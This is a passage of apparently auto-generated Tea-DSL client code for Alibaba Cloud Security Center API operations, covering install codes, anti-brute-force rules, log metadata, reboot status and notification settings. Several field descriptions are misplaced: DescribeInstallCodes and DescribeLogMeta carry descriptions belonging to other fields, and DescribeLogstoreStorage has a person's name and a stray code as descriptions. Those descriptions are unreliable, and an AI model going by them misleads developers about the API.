  return callApi(params, req, runtime);
}

async function describeInstallCode(): DescribeInstallCodeResponse {
  var runtime = new Util.RuntimeOptions{};
  return describeInstallCodeWithOptions(runtime);
}

model DescribeInstallCodesResponseBody = {
  installCodes?: [ 
    {
      captchaCode?: string(name='CaptchaCode', description='DescribeInstallCodes', example='15v02r'),
      expiredDate?: long(name='ExpiredDate', example='1637810007000'),
      groupId?: long(name='GroupId', example='9165712'),
      groupName?: string(name='GroupName', example='default'),
      onlyImage?: boolean(name='OnlyImage', description='Queries the commands that are used to manually install the Security Center Agent.', example='false'),
      os?: string(name='Os', example='linux'),
      vendorName?: string(name='VendorName', example='ALIYUN'),
    }
  ](name='InstallCodes', description='The ID of the request, which is used to locate and troubleshoot issues.'),
  requestId?: string(name='RequestId', description='The installation verification code for you to manually install the Security Center agent.', example='C0D6119F-92EE-1276-B8B6-C81A7F9D57F5'),
}

model DescribeInstallCodesResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: DescribeInstallCodesResponseBody(name='body'),
}

/**
  * The ID of the server group to which the server belongs.
  *
  * @param request DescribeInstallCodesRequest
  * @param runtime runtime options for this request RuntimeOptions
  * @return DescribeInstallCodesResponse
 */
async function describeInstallCodesWithOptions(runtime: Util.RuntimeOptions): DescribeInstallCodesResponse {
  var req = new OpenApi.OpenApiRequest{};
  var params = new OpenApi.Params{
    action = 'DescribeInstallCodes',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

/**
  * The ID of the server group to which the server belongs.
  *
  * @return DescribeInstallCodesResponse
 */
async function describeInstallCodes(): DescribeInstallCodesResponse {
  var runtime = new Util.RuntimeOptions{};
  return describeInstallCodesWithOptions(runtime);
}

model DescribeInstanceAntiBruteForceRulesRequest {
  currentPage?: int32(name='CurrentPage', example='1'),
  pageSize?: int32(name='PageSize', example='20'),
  resourceOwnerId?: long(name='ResourceOwnerId'),
  sourceIp?: string(name='SourceIp', example='115.238.XX.XX'),
  uuidList?: [ string ](name='UuidList'),
}

model DescribeInstanceAntiBruteForceRulesResponseBody = {
  pageInfo?: {
    count?: int32(name='Count', example='4'),
    currentPage?: int32(name='CurrentPage', example='1'),
    pageSize?: int32(name='PageSize', example='20'),
    totalCount?: int32(name='TotalCount', example='4'),
  }(name='PageInfo'),
  requestId?: string(name='RequestId', example='97286A-4A6B-4A4-95FA-EC7E3E2451'),
  rules?: [ 
    {
      id?: long(name='Id', example='215779601'),
      name?: string(name='Name', example='TestRule'),
      uuid?: string(name='Uuid', example='4fe8e1cd-3c37-4851-b9de-124da32c****'),
    }
  ](name='Rules'),
}

model DescribeInstanceAntiBruteForceRulesResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: DescribeInstanceAntiBruteForceRulesResponseBody(name='body'),
}

async function describeInstanceAntiBruteForceRulesWithOptions(request: DescribeInstanceAntiBruteForceRulesRequest, runtime: Util.RuntimeOptions): DescribeInstanceAntiBruteForceRulesResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.currentPage)) {
    query['CurrentPage'] = request.currentPage;
  }
  if (!Util.isUnset(request.pageSize)) {
    query['PageSize'] = request.pageSize;
  }
  if (!Util.isUnset(request.resourceOwnerId)) {
    query['ResourceOwnerId'] = request.resourceOwnerId;
  }
  if (!Util.isUnset(request.sourceIp)) {
    query['SourceIp'] = request.sourceIp;
  }
  if (!Util.isUnset(request.uuidList)) {
    query['UuidList'] = request.uuidList;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'DescribeInstanceAntiBruteForceRules',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function describeInstanceAntiBruteForceRules(request: DescribeInstanceAntiBruteForceRulesRequest): DescribeInstanceAntiBruteForceRulesResponse {
  var runtime = new Util.RuntimeOptions{};
  return describeInstanceAntiBruteForceRulesWithOptions(request, runtime);
}

model DescribeInstanceRebootStatusRequest {
  uuids?: string(name='Uuids', description='Queries the status of the servers that you restart.', example='d77f7802-4f0a-4221-ab02-4d999e****'),
}

model DescribeInstanceRebootStatusResponseBody = {
  rebootStatuses?: [ 
    {
      code?: string(name='Code', example='10001'),
      msg?: string(name='Msg', example='push failed'),
      rebootStatus?: int32(name='RebootStatus', example='2'),
      uuid?: string(name='Uuid', example='9b59c2d6-0967-46e3-ad7b-152227c****'),
    }
  ](name='RebootStatuses'),
  requestId?: string(name='RequestId', example='5BD95679-D63A-4151-97D0-188432F4A57'),
  totalCount?: int32(name='TotalCount', description='DescribeInstanceRebootStatus', example='100'),
}

model DescribeInstanceRebootStatusResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: DescribeInstanceRebootStatusResponseBody(name='body'),
}

async function describeInstanceRebootStatusWithOptions(request: DescribeInstanceRebootStatusRequest, runtime: Util.RuntimeOptions): DescribeInstanceRebootStatusResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.uuids)) {
    query['Uuids'] = request.uuids;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'DescribeInstanceRebootStatus',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function describeInstanceRebootStatus(request: DescribeInstanceRebootStatusRequest): DescribeInstanceRebootStatusResponse {
  var runtime = new Util.RuntimeOptions{};
  return describeInstanceRebootStatusWithOptions(request, runtime);
}

model DescribeInstanceStatisticsRequest {
  from?: string(name='From', example='sas'),
  lang?: string(name='Lang', example='zh'),
  sourceIp?: string(name='SourceIp', example='1.2.XX.XX'),
  uuid?: string(name='Uuid', example='6690a46c-0edb-4663-a641-3629d1a9****'),
}

model DescribeInstanceStatisticsResponseBody = {
  data?: [ 
    {
      account?: int32(name='Account', example='0'),
      agentlessAll?: int32(name='AgentlessAll', example='13'),
      agentlessBaseline?: int32(name='AgentlessBaseline', example='2'),
      agentlessMalicious?: int32(name='AgentlessMalicious', example='3'),
      agentlessVulCve?: int32(name='AgentlessVulCve', example='1'),
      agentlessVulSca?: int32(name='AgentlessVulSca', example='1'),
      appNum?: int32(name='AppNum', example='1'),
      cmsNum?: int32(name='CmsNum', example='5'),
      cspmNum?: int32(name='CspmNum', example='1'),
      cveNum?: int32(name='CveNum', example='1'),
      emgNum?: int32(name='EmgNum', example='6'),
      health?: int32(name='Health', example='2'),
      scaNum?: int32(name='ScaNum', example='1'),
      suspicious?: int32(name='Suspicious', example='2'),
      sysNum?: int32(name='SysNum', example='3'),
      trojan?: int32(name='Trojan', example='1'),
      uuid?: string(name='Uuid', example='6690a46c-0edb-4663-a641-3629d1a9****'),
      vul?: int32(name='Vul', example='17'),
      weakPWNum?: int32(name='WeakPWNum', example='22'),
    }
  ](name='Data'),
  requestId?: string(name='RequestId', example='8F035A9D-D19F-5430-8CA5-1497991B7C61'),
}

model DescribeInstanceStatisticsResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: DescribeInstanceStatisticsResponseBody(name='body'),
}

async function describeInstanceStatisticsWithOptions(request: DescribeInstanceStatisticsRequest, runtime: Util.RuntimeOptions): DescribeInstanceStatisticsResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.from)) {
    query['From'] = request.from;
  }
  if (!Util.isUnset(request.lang)) {
    query['Lang'] = request.lang;
  }
  if (!Util.isUnset(request.sourceIp)) {
    query['SourceIp'] = request.sourceIp;
  }
  if (!Util.isUnset(request.uuid)) {
    query['Uuid'] = request.uuid;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'DescribeInstanceStatistics',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function describeInstanceStatistics(request: DescribeInstanceStatisticsRequest): DescribeInstanceStatisticsResponse {
  var runtime = new Util.RuntimeOptions{};
  return describeInstanceStatisticsWithOptions(request, runtime);
}

model DescribeIpTagsRequest {
  ip?: string(name='Ip', example='192.168.XX.XX'),
  securityEventId?: string(name='SecurityEventId', example='11'),
}

model DescribeIpTagsResponseBody = {
  requestId?: string(name='RequestId', example='E70074C8-DFB4-44C5-96C7-909DXXXXXXX'),
  tags?: string(name='Tags', example='latest'),
}

model DescribeIpTagsResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: DescribeIpTagsResponseBody(name='body'),
}

async function describeIpTagsWithOptions(request: DescribeIpTagsRequest, runtime: Util.RuntimeOptions): DescribeIpTagsResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.ip)) {
    query['Ip'] = request.ip;
  }
  if (!Util.isUnset(request.securityEventId)) {
    query['SecurityEventId'] = request.securityEventId;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'DescribeIpTags',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function describeIpTags(request: DescribeIpTagsRequest): DescribeIpTagsResponse {
  var runtime = new Util.RuntimeOptions{};
  return describeIpTagsWithOptions(request, runtime);
}

model DescribeLatestScanTaskResponseBody = {
  lastCheckTime?: long(name='LastCheckTime', example='1671610264000'),
  requestId?: string(name='RequestId', example='7E0618A9-D5EF-4220-9471-C42XXXXXXXX'),
  riskNum?: int32(name='RiskNum', example='1'),
  targetInfo?: string(name='TargetInfo', example='[{"type":"uuid","name":"Host001","target":"503201a7-14c6-4280-801b-1169ed42****"}]'),
  uuids?: [ string ](name='Uuids'),
}

model DescribeLatestScanTaskResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: DescribeLatestScanTaskResponseBody(name='body'),
}

async function describeLatestScanTaskWithOptions(runtime: Util.RuntimeOptions): DescribeLatestScanTaskResponse {
  var req = new OpenApi.OpenApiRequest{};
  var params = new OpenApi.Params{
    action = 'DescribeLatestScanTask',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function describeLatestScanTask(): DescribeLatestScanTaskResponse {
  var runtime = new Util.RuntimeOptions{};
  return describeLatestScanTaskWithOptions(runtime);
}

model DescribeLogMetaRequest {
  from?: string(name='From', description='The topic of logs that are delivered.', example='sas'),
  lang?: string(name='Lang', description='The category of logs. Valid values:

*   **host**: host logs
*   **network**: network logs
*   **security**: security logs', example='zh'),
  sourceIp?: string(name='SourceIp', description='The ID of the request source. Default value: **aegis**. Valid values:

*   **aegis**: Server Guard
*   **sas**: Security Center

>  If you use Server Guard, set the value to **aegis**. If you use Security Center, set the value to **sas**.', example='123.168.XX.XX'),
}

model DescribeLogMetaResponseBody = {
  logMetaList?: [ 
    {
      category?: string(name='Category', example='host'),
      hotTtl?: int32(name='HotTtl', example='-1'),
      logDesc?: string(name='LogDesc', description='The ID of the request, which is used to locate and troubleshoot issues.', example='Login'),
      logStore?: string(name='LogStore', description='Queries the configurations of the log analysis feature provided by Security Center.', example='aegis-log-login'),
      project?: string(name='Project', example='aegis-log'),
      status?: string(name='Status', description='The configurations of the log analysis feature.', example='enabled'),
      topic?: string(name='Topic', example='aegis-log-login'),
      ttl?: int32(name='Ttl', example='180'),
      userLogStore?: string(name='UserLogStore', example='aegis-log-network'),
      userProject?: string(name='UserProject', description='DescribeLogMeta', example='sasnew-log-XXXX-cn-hangzhou'),
      userRegion?: string(name='UserRegion', example='cn-hangzhou'),
    }
  ](name='LogMetaList', description='The name of the dedicated project in which logs are stored.'),
  requestId?: string(name='RequestId', description='The name of the dedicated Logstore in which logs are stored.', example='D0D6E6E4-CB8C-4897-B852-46AEFDA04B21'),
  totalCount?: int32(name='TotalCount', description='The source IP address of the request.', example='100'),
}

model DescribeLogMetaResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: DescribeLogMetaResponseBody(name='body'),
}

async function describeLogMetaWithOptions(request: DescribeLogMetaRequest, runtime: Util.RuntimeOptions): DescribeLogMetaResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.from)) {
    query['From'] = request.from;
  }
  if (!Util.isUnset(request.lang)) {
    query['Lang'] = request.lang;
  }
  if (!Util.isUnset(request.sourceIp)) {
    query['SourceIp'] = request.sourceIp;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'DescribeLogMeta',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function describeLogMeta(request: DescribeLogMetaRequest): DescribeLogMetaResponse {
  var runtime = new Util.RuntimeOptions{};
  return describeLogMetaWithOptions(request, runtime);
}

model DescribeLogShipperStatusRequest {
  from?: string(name='From', description='The ID of the request source. Set the value to **sas**.', example='sas'),
}

model DescribeLogShipperStatusResponseBody = {
  logShipperStatus?: {
    authStatus?: string(name='AuthStatus', description='Indicates whether Security Center is authorized to access Log Service. Valid values:

*   **yes**
*   **no**', example='yes'),
    buyStatus?: string(name='BuyStatus', description='Indicates whether the log analysis feature is purchased. Valid values:

*   **yes**
*   **no**', example='yes'),
    openStatus?: string(name='OpenStatus', description='The status of the log analysis feature. Valid values:

*   **yes**: enabled
*   **no**: disabled', example='yes'),
    postPaidOpenStatus?: string(name='PostPaidOpenStatus', description='Indicates whether the pay-as-you-go billing method is used. Valid values:

*   **yes**
*   **no**', example='no'),
    postPaidSupportStatus?: string(name='PostPaidSupportStatus', description='Indicates whether the log analysis feature supports the pay-as-you-go billing method. Valid values:

*   **yes**
*   **no**', example='yes'),
    slsProjectStatus?: string(name='SlsProjectStatus', description='The status of the dedicated Log Service project. Valid values:

*   **Normal**: normal
*   **Disable**: disabled', example='Normal'),
    slsServiceStatus?: string(name='SlsServiceStatus', description='Indicates whether Log Service is activated. Valid values:

*   **yes**
*   **no**', example='yes'),
  }(name='LogShipperStatus', description='The status information.'),
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='24A20733-10A0-4AF6-BE6B-E3322413****'),
}

model DescribeLogShipperStatusResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: DescribeLogShipperStatusResponseBody(name='body'),
}

async function describeLogShipperStatusWithOptions(request: DescribeLogShipperStatusRequest, runtime: Util.RuntimeOptions): DescribeLogShipperStatusResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.from)) {
    query['From'] = request.from;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'DescribeLogShipperStatus',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function describeLogShipperStatus(request: DescribeLogShipperStatusRequest): DescribeLogShipperStatusResponse {
  var runtime = new Util.RuntimeOptions{};
  return describeLogShipperStatusWithOptions(request, runtime);
}

model DescribeLoginBaseConfigsRequest {
  currentPage?: int32(name='CurrentPage', description='The number of the page to return. Default value: **1**.', example='1'),
  pageSize?: int32(name='PageSize', description='The number of entries to return on each page. Default value: **5**.', example='5'),
  target?: string(name='Target', description='The server to which the configuration is applied. The value of this parameter is in the JSON format and contains the following fields:

*   **Target**: the UUID or group ID of the server to add or delete.

> If targetType is set to uuid, the value of Target is the UUID of the server. If targetType is set to groupId, the value of Target is the group ID of the server. If targetType is set to global, the value of Target is a hyphen (-).

*   **targetType**: the type of the server to which the configuration is applied. Valid values:

    *   **uuid**: a server
    *   **groupId**: a server group
    *   **global**: all servers', example='[ {"target": "inet-7c676676-06fa-442e-90fb-b802e5d6****", "targetType": "uuid" } ]'),
  type?: string(name='Type', description='The logon type of the configuration to query. Valid values:

*   **login\\_common_location**: common logon location
*   **login\\_common_ip**: common logon IP address
*   **login\\_common_time**: common logon time range
*   **login\\_common_account**: common logon account', example='login_common_location'),
}

model DescribeLoginBaseConfigsResponseBody = {
  baseConfigs?: [ 
    {
      account?: string(name='Account', description='The common logon account.', example='1582318****'),
      endTime?: string(name='EndTime', description='The end time of the common logon time range.', example='07:00'),
      ip?: string(name='Ip', description='The common logon IP address.', example='192.168.XX.XX'),
      location?: string(name='Location', description='The common logon location.', example='Montenegro'),
      remark?: string(name='Remark'),
      startTime?: string(name='StartTime', description='The start time of the common logon time range.', example='08:00'),
      targetList?: [ 
        {
          target?: string(name='Target', description='The UUID or group ID of the server.', example='0011ea53-738c-4bff-93be-ce6a1cc9****'),
          targetType?: string(name='TargetType', description='The type of the server to which the configuration is applied. Valid values:

*   **uuid**: a server
*   **groupId**: a server group
*   **global**: all servers', example='uuid'),
        }
      ](name='TargetList', description='The details of the servers to which the configuration is applied.'),
      totalCount?: int32(name='TotalCount', description='The total number of servers.', example='172'),
      uuidCount?: int32(name='UuidCount', description='The number of servers to which the configuration is applied.', example='13'),
    }
  ](name='BaseConfigs', description='An array that consists of the information about the configurations.'),
  currentPage?: int32(name='CurrentPage', description='The page number of the returned page.', example='1'),
  pageSize?: int32(name='PageSize', description='The number of entries returned per page. Default value: **20**.', example='20'),
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='2C2D4B3C-0524-17B1-93D2-DA50119F4E1E'),
  totalCount?: int32(name='TotalCount', description='The total number of entries returned.', example='200'),
}

model DescribeLoginBaseConfigsResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: DescribeLoginBaseConfigsResponseBody(name='body'),
}

async function describeLoginBaseConfigsWithOptions(request: DescribeLoginBaseConfigsRequest, runtime: Util.RuntimeOptions): DescribeLoginBaseConfigsResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.currentPage)) {
    query['CurrentPage'] = request.currentPage;
  }
  if (!Util.isUnset(request.pageSize)) {
    query['PageSize'] = request.pageSize;
  }
  if (!Util.isUnset(request.target)) {
    query['Target'] = request.target;
  }
  if (!Util.isUnset(request.type)) {
    query['Type'] = request.type;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'DescribeLoginBaseConfigs',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function describeLoginBaseConfigs(request: DescribeLoginBaseConfigsRequest): DescribeLoginBaseConfigsResponse {
  var runtime = new Util.RuntimeOptions{};
  return describeLoginBaseConfigsWithOptions(request, runtime);
}

model DescribeLoginSwitchConfigsResponseBody = {
  configList?: [ 
    {
      item?: string(name='Item', description='The type of the alert that you enabled or disabled. Valid values:

*   **login\\_common_ip**: alerts for unapproved logon IP addresses
*   **login\\_common_time**: alerts for unapproved logon time ranges
*   **login\\_common_account**: alerts for unapproved logon accounts', example='login_common_ip'),
      status?: int32(name='Status', description='The status of the Log Service feature. Valid values:

*   **0**: The feature is disabled.
*   **1**: The feature is enabled.', example='0'),
    }
  ](name='ConfigList', description='The configuration item returned.'),
  count?: int32(name='Count', description='The number of returned configuration items.', example='2'),
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='0B48AB3C-84FC-424D-A01D-B9270EF4****'),
}

model DescribeLoginSwitchConfigsResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: DescribeLoginSwitchConfigsResponseBody(name='body'),
}

async function describeLoginSwitchConfigsWithOptions(runtime: Util.RuntimeOptions): DescribeLoginSwitchConfigsResponse {
  var req = new OpenApi.OpenApiRequest{};
  var params = new OpenApi.Params{
    action = 'DescribeLoginSwitchConfigs',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function describeLoginSwitchConfigs(): DescribeLoginSwitchConfigsResponse {
  var runtime = new Util.RuntimeOptions{};
  return describeLoginSwitchConfigsWithOptions(runtime);
}

model DescribeLogstoreStorageRequest {
  from?: string(name='From', description='The ID of the request, which is used to locate and troubleshoot issues.', example='sas'),
  lang?: string(name='Lang', description='The purchased log storage capacity, in GB.', example='zh'),
}

model DescribeLogstoreStorageResponseBody = {
  logstore?: string(name='Logstore', description='WB01014029', example='sas-log'),
  preserve?: long(name='Preserve', example='12240'),
  requestId?: string(name='RequestId', description='谈佳伟', example='25EC270F-5783-4416-AD7C-1EDF063A039C'),
  ttl?: int32(name='Ttl', description='DescribeLogstoreStorage', example='180'),
  used?: long(name='Used', description='Queries the purchased log storage capacity.', example='335'),
  userProject?: string(name='UserProject', example='sas-log-XXXX-cn-hangzhou'),
}

model DescribeLogstoreStorageResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: DescribeLogstoreStorageResponseBody(name='body'),
}

async function describeLogstoreStorageWithOptions(request: DescribeLogstoreStorageRequest, runtime: Util.RuntimeOptions): DescribeLogstoreStorageResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.from)) {
    query['From'] = request.from;
  }
  if (!Util.isUnset(request.lang)) {
    query['Lang'] = request.lang;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'DescribeLogstoreStorage',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function describeLogstoreStorage(request: DescribeLogstoreStorageRequest): DescribeLogstoreStorageResponse {
  var runtime = new Util.RuntimeOptions{};
  return describeLogstoreStorageWithOptions(request, runtime);
}

model DescribeMachineCanRebootRequest {
  type?: string(name='Type', example='sys'),
  uuid?: string(name='Uuid', example='5b268326-273e-44fc-a0e3-9482435c****'),
}

model DescribeMachineCanRebootResponseBody = {
  canReboot?: boolean(name='CanReboot', example='true'),
  requestId?: string(name='RequestId', example='79CFF74D-E967-5407-8A78-EE03B925FDAA'),
}

model DescribeMachineCanRebootResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: DescribeMachineCanRebootResponseBody(name='body'),
}

async function describeMachineCanRebootWithOptions(request: DescribeMachineCanRebootRequest, runtime: Util.RuntimeOptions): DescribeMachineCanRebootResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.type)) {
    query['Type'] = request.type;
  }
  if (!Util.isUnset(request.uuid)) {
    query['Uuid'] = request.uuid;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'DescribeMachineCanReboot',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function describeMachineCanReboot(request: DescribeMachineCanRebootRequest): DescribeMachineCanRebootResponse {
  var runtime = new Util.RuntimeOptions{};
  return describeMachineCanRebootWithOptions(request, runtime);
}

model DescribeModuleConfigResponseBody = {
  count?: int32(name='Count', description='The number of configurations for the module.', example='2'),
  httpStatusCode?: int32(name='HttpStatusCode', description='The HTTP status code returned.', example='200'),
  moduleConfigList?: [ 
    {
      configName?: string(name='ConfigName', description='The name of the configuration.', example='timescan'),
      items?: [ 
        {
          groupId?: int32(name='GroupId', description='The ID of the server group to which the server belongs.', example='173'),
          instanceId?: string(name='InstanceId', description='The ID of the server.', example='i-uf6435dn4t59b9av****'),
          instanceName?: string(name='InstanceName', description='The name of the server.', example='inStanceName****'),
          ip?: string(name='Ip', description='The IP address of the server.', example='31.13.XX.XX'),
          region?: string(name='Region', description='The region in which the server resides.', example='cn-hangzhou'),
          uuid?: string(name='Uuid', description='The UUID of the server.', example='a47e3713-ed22-4015-93a3-d88ebe6****'),
        }
      ](name='Items', description='An array that consists of the configuration items.'),
      moduleName?: string(name='ModuleName', description='The name of the module.', example='alihids'),
    }
  ](name='ModuleConfigList', description='An array that consists of the configurations.'),
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='7E0618A9-D5EF-4220-9471-C42B5E92719F'),
  success?: boolean(name='Success', description='Indicates whether the request was successful. Valid values:

*   **true**: The request was successful.
*   **false**: The request failed.', example='true'),
}

model DescribeModuleConfigResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: DescribeModuleConfigResponseBody(name='body'),
}

async function describeModuleConfigWithOptions(runtime: Util.RuntimeOptions): DescribeModuleConfigResponse {
  var req = new OpenApi.OpenApiRequest{};
  var params = new OpenApi.Params{
    action = 'DescribeModuleConfig',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function describeModuleConfig(): DescribeModuleConfigResponse {
  var runtime = new Util.RuntimeOptions{};
  return describeModuleConfigWithOptions(runtime);
}

model DescribeNoticeConfigRequest {
  sourceIp?: string(name='SourceIp', description='The source IP address of the request.', example='60.191.XX.XX'),
}

model DescribeNoticeConfigResponseBody = {
  noticeConfigList?: [ 
    {
      aliUid?: long(name='AliUid', description='The ID of the user.', example='12123414****'),
      currentPage?: int32(name='CurrentPage', description='The page number of the returned page.', example='1'),
      project?: string(name='Project', description='The identifier of the notification item. Valid values:

*   **yundun\\_security_Weekreport**: notification for vulnerabilities
*   **yundun\\_sas\\_antiransomware_task**: notification for results of restoration tasks
*   **sas_healthcheck**: notification for baseline checks
*   **sas_suspicious**: notification for alerts generated by Security Center
*   **yundun\\_aegis\\_AV_true**: notification for precision defense
*   **yundun\\_sas\\_ak_leakage**: notification for AccessKey pair leaks
*   **yundun\\_sas\\_config_alert**: notification for configuration assessment
*   **yundun\\_sas\\_vul_Emergency**: notification for urgent vulnerabilities
*   **yundun\\_webguard_event**: notification for web tamper proofing
*   **yundun\\_sas\\_cloud\\_native_firewall**: notification for alerts generated by the container firewall feature
*   **yundun\\_sas\\_cloud\\_native\\_firewall_Defense**: notification for proactive defense implemented by the container firewall feature
*   **yundun\\_IP_Blocking**: notification for blocked brute-force attacks initiated from malicious IP addresses
*   **yundun\\_sas\\_anti\\_virus_config**: notification for virus scan
*   **yundun\\_sas_log**: notification for excess logs
*   **yundun\\_honeypot_alarm**: notification for alerts generated by the honeypot feature
*   **aliyun\\_rasp_alarm**: notification for alerts generated by the application security feature
*   **virusScheduleTask**: notification for completion of scheduled virus scans
*   **yundun\\_anti_Virus**: notification that no security checks are performed
*   **sas_vulnerability**: notification for vulnerabilities
*   **weeklyreport**: notification for weekly reports
*   **agent**: notification that the Security Center agent is offline
*   **bruteforcesuccess**: notification for protection against brute-force attacks
*   **webshell**: notification for webshells
*   **suspicious**: notification for alerts generated by Server Guard
*   **patch**: deprecated
*   **remotelogin**: notification for remote logons
*   **health**: notification for security checks
*   **yundun\\_sas\\_cloudsiem_log**: notifications of insufficient threat analysis log capacity

> If the value is **yundun\\_security_Weekreport**, weekly reports are sent to notify you of unhandled vulnerabilities.', example='sas_suspicious'),
      route?: int32(name='Route', description='The notification method. Valid values:

*   **1**: text message
*   **2**: email
*   **4**: internal message
*   **3**: text message and email
*   **5**: text message and internal message
*   **6**: email and internal message
*   **7**: text message, email, and internal message', example='7'),
      timeLimit?: int32(name='TimeLimit', description='The time period during which Security Center sends notifications. Valid values:

*   **0**: any time
*   **1**: 08:00 to 22:00', example='1'),
    }
  ](name='NoticeConfigList', description='An array that consists of the notification settings.'),
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='D185B7FF-E24C-422D-83D3-C2A25C7A2727'),
}

model DescribeNoticeConfigResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: DescribeNoticeConfigResponseBody(name='body'),
}

async function describeNoticeConfigWithOptions(request: DescribeNoticeConfigRequest, runtime: Util.RuntimeOptions): DescribeNoticeConfigResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.sourceIp)) {
    query['SourceIp'] = request.sourceIp;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'DescribeNoticeConfig',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
